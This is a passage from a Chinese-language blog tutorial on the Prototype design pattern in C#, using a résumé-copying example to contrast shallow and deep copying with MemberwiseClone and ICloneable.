<span class="token punctuation">:</span> <span class="token keyword">base</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">/// &lt;summary></span>     <span class="token comment" spellcheck="true">/// 实现原型类中的继承而来的虚方法</span>     <span class="token comment" spellcheck="true">/// &lt;/summary></span>     <span class="token comment" spellcheck="true">/// &lt;returns>&lt;/returns></span>     <span class="token keyword">public</span> <span class="token keyword">override</span> Prototype <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// Shallow copy </span>         <span class="token keyword">return</span> <span class="token punctuation">(</span>Prototype<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Program客户类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/// &lt;summary></span><span class="token comment" spellcheck="true">/// 客户端</span><span class="token comment" spellcheck="true">/// &lt;/summary></span><span class="token keyword">class</span> <span class="token class-name">Program</span><span class="token punctuation">{</span>   <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>   <span class="token punctuation">{</span>       ConcretePrototype1 p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcretePrototype1</span><span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       ConcretePrototype1 c1 <span class="token operator">=</span> <span class="token punctuation">(</span>ConcretePrototype1<span class="token punctuation">)</span>p1<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"Cloned: {0}"</span><span class="token punctuation">,</span> c1<span class="token punctuation">.</span>Id<span class="token punctuation">)</span><span class="token punctuation">;</span>       ConcretePrototype2 p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcretePrototype2</span><span class="token punctuation">(</span><span class="token string">"II"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       ConcretePrototype2 c2 <span class="token operator">=</span> <span class="token punctuation">(</span>ConcretePrototype2<span class="token punctuation">)</span>p2<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"Cloned: {0}"</span><span class="token punctuation">,</span> c2<span class="token punctuation">.</span>Id<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// Wait for user </span>       Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>结果展示：</p><blockquote><p>Cloned：$\mathbf I$</p><p>Cloned：$\mathbf I$$\mathbf I$</p></blockquote><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p><strong>优点</strong>：</p><ul><li><p>隐藏对象创建的细节</p></li><li><p>大大提高程序的性能</p></li></ul><p><strong>缺点：</strong></p><ul><li>使用时较复杂，需要区分<strong>浅复制</strong>和<strong>深复制</strong></li></ul><p>注：</p><ul><li><p>浅复制与深复制：</p><ul><li><p><strong>浅复制</strong>只将类中的值类型进行复制，不会对引用类型进行复制，所有对象的引用类型指向最后一个对象对引用类型的赋值。</p></li><li><p><strong>深复制</strong>可以将类中的引用类型也完成复制。</p></li></ul></li></ul><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>​        创建的对象十分耗费空间资源，就创建一个相似的对象，在需要时对其进行克隆操作来创建一个新的对象。</p><h2 id="投简历引发的思考"><a href="#投简历引发的思考" class="headerlink" title="投简历引发的思考"></a>投简历引发的思考</h2><p>​        对于一个普通的应届毕业生来说多投简历可能就意味着有更多被选择的机会，但简历也不能千篇一律，投不同公司或职位都用同一个简历，最好对应不同的职位设计不同的简历。<font color="red">以此为需求编程实现简历复印的功能</font>。</p><h3 id="普通实现"><a href="#普通实现" class="headerlink" title="普通实现"></a>普通实现</h3><p><strong>程序类图：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/普通实现.png" alt="普通实现"></center><p><strong>代码实现：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 原型模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2019"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2019"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2019"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//简历</span>    <span class="token keyword">class</span> <span class="token class-name">Resume</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> sex<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> age<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> timeArea<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> company<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Resume</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置个人信息</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> sex<span class="token punctuation">,</span> <span class="token keyword">string</span> age<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置工作经历</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token keyword">string</span> timeArea<span class="token punctuation">,</span> <span class="token keyword">string</span> company<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>timeArea <span class="token operator">=</span> timeArea<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>company <span class="token operator">=</span> company<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//显示</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0} {1} {2}"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"工作经历：{0} {1}"</span><span class="token punctuation">,</span> timeArea<span class="token punctuation">,</span> company<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示：</strong></p><blockquote><p>小王 男 29<br>工作经历：2010-2019 XX公司<br>小王 男 29<br>工作经历：2010-2019 XX公司<br>小王 男 29<br>工作经历：2010-2019 XX公司</p></blockquote><p>​        使用这个方式进行简历复制时会产生三个Resume对象，而且这三个对象存储的字面值完全相同，下面代码也能产生一致的效果但是占用的存储空间仅为上述代码实现的三分之一。</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2019"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> a            Resume c <span class="token operator">=</span> a            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>​        上述两种代码都实现了简历复制的需求，但就占用存储空间来说的话，第二种实现更加节省空间。而就其扩展性来说，两种实现都没有满足很好的扩展，如：<font color="red">要投递不同职位的简历时，毕业生的基本信息是不会发生变化的，但是各个简历所侧重的工作经历是不同的。</font>要实现这样的需求，对于上面的实现就需要修改代码才能实现。而原型模式则可以在原有对象的基础上进行拷贝得到一个新的对象（<font color="blue">在这个可修改新对象的信息</font>）。</p><h3 id="原型实现"><a href="#原型实现" class="headerlink" title="原型实现"></a>原型实现</h3><p><strong>程序类图：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/原型实现.png" alt="原型实现"></center><p><strong>代码实现：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 原型模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2014"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2015-2018"</span><span class="token punctuation">,</span> <span class="token string">"YY企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume c <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//简历</span>    <span class="token keyword">class</span> <span class="token class-name">Resume</span> <span class="token punctuation">:</span> ICloneable    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> sex<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> age<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> timeArea<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> company<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Resume</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置个人信息</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> sex<span class="token punctuation">,</span> <span class="token keyword">string</span> age<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置工作经历</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token keyword">string</span> timeArea<span class="token punctuation">,</span> <span class="token keyword">string</span> company<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>timeArea <span class="token operator">=</span> timeArea<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>company <span class="token operator">=</span> company<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//显示</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0} {1} {2}"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"工作经历：{0} {1}"</span><span class="token punctuation">,</span> timeArea<span class="token punctuation">,</span> company<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 实现接口中的方法</span>        <span class="token keyword">public</span> Object <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>Object<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示：</strong></p><blockquote><p>小王 男 29<br>工作经历：2010-2014 XX公司<br>小王 男 29<br>工作经历：2015-2018 YY企业<br>小王 男 24<br>工作经历：2010-2014 XX公司</p></blockquote><p>​        上述代码实现了一个人不同工作经历的拷贝，同时也可以对人员的信息进行修改（方便拷贝一波，大家懂的😜）。但上述情况中存在一个问题，原型中字段全部为值类型。<font color="red">MemberwiseClone方法对值类型的字段执行逐位复制，对引用类型字段进行引用复制，也即浅复制。</font>下面的实现方式可能帮助您更好的理解。</p><h3 id="浅复制实现"><a href="#浅复制实现" class="headerlink" title="浅复制实现"></a>浅复制实现</h3><p><strong>程序类图：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/浅复制.png" alt="浅复制"></center><p><strong>代码实现：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 原型模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"小王"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2010-2014"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"2015-2018"</span><span class="token punctuation">,</span> <span class="token string">"YY企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume c <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"1998-2003"</span><span class="token punctuation">,</span> <span class="token string">"ZZ企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//简历            --真实原型类</span>    <span class="token keyword">class</span> <span class="token class-name">Resume</span> <span class="token punctuation">:</span> ICloneable               <span class="token comment" spellcheck="true">//直接实现系统提供的ICloneable接口</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> sex<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> age<span class="token punctuation">;</span>        <span class="token keyword">private</span> WorkExperience work<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//引用类型</span>        <span class="token keyword">public</span> <span class="token function">Resume</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            work <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WorkExperience</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置个人信息</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> sex<span class="token punctuation">,</span> <span class="token keyword">string</span> age<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置工作经历</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token keyword">string</span> workDate<span class="token punctuation">,</span> <span class="token keyword">string</span> company<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            work<span class="token punctuation">.</span>WorkDate <span class="token operator">=</span> workDate<span class="token punctuation">;</span>            work<span class="token punctuation">.</span>Company <span class="token operator">=</span> company<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//显示</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0} {1} {2}"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"工作经历：{0} {1}"</span><span class="token punctuation">,</span> work<span class="token punctuation">.</span>WorkDate<span class="token punctuation">,</span> work<span class="token punctuation">.</span>Company<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Object <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>Object<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//工作经历</span>    <span class="token keyword">class</span> <span class="token class-name">WorkExperience</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> workDate<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> WorkDate        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> workDate<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> workDate <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> company<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Company        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> company<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> company <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示：</strong></p><blockquote><p>小王 男 29<br>工作经历：1998-2003 ZZ企业<br>小王 男 29<br>工作经历：1998-2003 ZZ企业<br>小王 男 24<br>工作经历：1998-2003 ZZ企业</p></blockquote><p>​        三个简历输出工作经历是最后一次修改的结果，显然不是我们想要得到的效果。<font color="red">原因：三个Resume对象的work字段都指向最初实例化WorkExperience对象的地址，任何一次修改都会影响到其他两个对象中的work字段</font>。</p><h3 id="深复制实现"><a href="#深复制实现" class="headerlink" title="深复制实现"></a>深复制实现</h3><p><strong>程序类图：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/深复制.png" alt="深复制"></center><p><strong>代码实现：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 原型模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Resume a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token string">"大鸟"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token string">"男"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"1998-2000"</span><span class="token punctuation">,</span> <span class="token string">"XX公司"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume b <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 